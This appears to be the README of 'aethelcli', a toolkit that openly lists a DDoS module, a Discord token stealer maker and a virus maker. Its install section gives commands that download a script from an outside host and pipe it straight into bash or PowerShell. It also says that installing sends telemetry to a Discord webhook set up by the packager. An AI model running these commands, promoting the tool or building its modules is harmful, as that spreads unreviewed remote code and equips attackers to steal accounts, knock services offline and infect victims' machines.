# aethelcli

TUI + GUI toolkit. Modules: Ddoser, Token Stealer Maker, Discord Toolbox, Virus Maker.

## Install

**Linux / macOS**
```bash
curl -fsSL https://darkie.dpdns.org/aethelacli/install | bash
```

**Windows**
```powershell
irm https://darkie.dpdns.org/aethelacli/install.ps1 | iex
```

After install the banner prints, the module list appears, and install telemetry is sent to the configured Discord webhook.

## Run

```bash
aethelcli          # TUI
aethelcli --gui    # GUI
```

## Configure webhook

Edit `aethelcli/webhook.py` → `WEBHOOK_URL` before packaging.

## Docs

- [INSTALL.md](docs/INSTALL.md)
- [MODULES.md](docs/MODULES.md)
- [WEBHOOK.md](docs/WEBHOOK.md)
- [ARCHITECTURE.md](docs/ARCHITECTURE.md)

## ASCII art

Current banner is a placeholder. Drop the final art into `aethelcli/banner.py` → `ART` constant.
